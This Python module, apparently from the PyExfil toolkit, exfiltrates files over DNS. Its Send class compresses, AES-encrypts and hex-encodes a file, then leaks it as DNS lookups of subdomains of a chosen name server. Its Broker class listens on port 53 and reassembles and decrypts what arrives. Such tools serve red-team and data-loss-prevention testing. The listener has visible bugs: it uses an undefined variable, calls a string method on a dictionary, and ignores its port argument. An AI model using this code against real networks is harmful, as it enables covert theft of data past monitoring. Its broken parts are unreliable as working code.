#!/usr/bin/env python3

import sys
import zlib
import socket
import struct
import hashlib
import binascii

from pyexfil.includes.prepare import PrepFile
from pyexfil.includes.exceptions import FileDoesNotExist
from pyexfil.includes.general import _split_every_n, does_file_exist
from pyexfil.includes.encryption_wrappers import PYEXFIL_DEFAULT_PASSWORD
from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB


# Settings
TIMEOUT             = 0.1
PACKET_MAX_SIZE     = 128

DNS_QUERY_MESSAGE_HEADER = struct.Struct("!6H")
DNS_QUERY_SECTION_FORMAT = struct.Struct("!2H")


# Setup
socket.setdefaulttimeout(TIMEOUT)


def _send_packet(host):
    try:
        addr1 = socket.gethostbyname(host)
    except:
        pass
    return True


def _testCallBack(pkt):
    pass


def decode_labels(message, offset):
    labels = []

    while True:
        length, = struct.unpack_from("!B", message, offset)

        if (length & 0xC0) == 0xC0:
            pointer, = struct.unpack_from("!H", message, offset)
            offset += 2

            return labels + decode_labels(message, pointer & 0x3FFF), offset

        if (length & 0xC0) != 0x00:
            raise StandardError("unknown label encoding")

        offset += 1

        if length == 0:
            return labels, offset

        labels.append(*struct.unpack_from("!%ds" % length, message, offset))
        offset += length


def decode_question_section(message, offset, qdcount):
    questions = []

    for _ in range(qdcount):
        qname, offset = decode_labels(message, offset)

        qtype, qclass = DNS_QUERY_SECTION_FORMAT.unpack_from(message, offset)
        offset += DNS_QUERY_SECTION_FORMAT.size

        question = {"domain_name": qname,
                    "query_type": qtype,
                    "query_class": qclass}

        questions.append(question)

    return questions, offset


def decode_dns_message(message):

    id, misc, qdcount, ancount, nscount, arcount = DNS_QUERY_MESSAGE_HEADER.unpack_from(message)

    qr = (misc & 0x8000) != 0
    opcode = (misc & 0x7800) >> 11
    aa = (misc & 0x0400) != 0
    tc = (misc & 0x200) != 0
    rd = (misc & 0x100) != 0
    ra = (misc & 0x80) != 0
    z = (misc & 0x70) >> 4
    rcode = misc & 0xF

    offset = DNS_QUERY_MESSAGE_HEADER.size
    questions, offset = decode_question_section(message, offset, qdcount)

    result = {"id": id,
              "is_response": qr,
              "opcode": opcode,
              "is_authoritative": aa,
              "is_truncated": tc,
              "recursion_desired": rd,
              "recursion_available": ra,
              "reserved": z,
              "response_code": rcode,
              "question_count": qdcount,
              "answer_count": ancount,
              "authority_count": nscount,
              "additional_count": arcount,
              "questions": questions}

    return result


class Send:
    def __init__(self, file_path, name_server, key=PYEXFIL_DEFAULT_PASSWORD):
        if not does_file_exist(file_path):
            FileDoesNotExist(file_path)
        self.file_path      = file_path
        self.name_server    = name_server
        self.key            = key
        self.data           = None

        self._load_data()

    def _load_data(self):
        self.data = ""
        try:
            f = open(self.file_path, 'rb')
            data = f.read()
            f.close()
        except Exception as e:
            sys.stderr.write("Could not read file.\n")
            sys.stderr.write("Error: %s.\n" % e )
            sys.exit(1)
            return False

        self.data = data
        return True

    def Exfiltrate(self):
        data            = zlib.compress(self.data)
        data            = AESEncryptOFB(text=data, key=self.key)
        data_as_hex     = str(binascii.hexlify(data))[2:-1]
        exfiltrate_this = _split_every_n(data_as_hex, PACKET_MAX_SIZE)

        for item in exfiltrate_this:
            _send_packet('%s.%s' % (item, self.name_server))

        return True


class Broker:
    def __init__(self, key=PYEXFIL_DEFAULT_PASSWORD, retFunc=_testCallBack, host='', port=53):
        self.key            = key
        self.callBack       = retFunc
        self.host           = host
        self.port           = 53
        self.raw_compiled   = []

    def Listen(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((self.host, self.port))
        try:
            while True:
                sys.stdout.write("When done, just hit CTRL+C and i will compile it.\n")
                data, addr = s.recvfrom(PACKET_MAX_SIZE)
                sys.stdout.write("Got incoming packet from %s.\n" % addr)
                dns_decoded = decode_dns_message(data)
                if dns_decoded['questions'][0].endswith(host):
                    self.raw_compiled.append(dns_decoded['questions'][0])
        except KeyboardInterrupt as e:
            sys.stdout.write("Compiling...")
            j = ''
            for i in self.raw_compiled:
                j += i

            try:
                data = binascii.unhexlify(j)
            except:
                sys.stderr.write("Could not decode data.\n")
                sys.exit(1)

            try:
                data = AESDecryptOFB(text=data, key=self.key)
            except:
                sys.stderr.write("Could not decrypt data.\n")
                sys.exit(1)

            try:
                data = zlib.decompress(data)
            except:
                sys.stderr.write("Could not decompress data.\n")
                sys.exit(1)

            fname = hashlib.md5(data).hexdigest()
            open(fname, 'wb').write(data)
            sys.stdout.write("Data in %s.\n" % fname)


if __name__ == "__main__":
    sys.stdout.write("I am a module, Jim, not a doctor!\n")
    sys.exit(0)
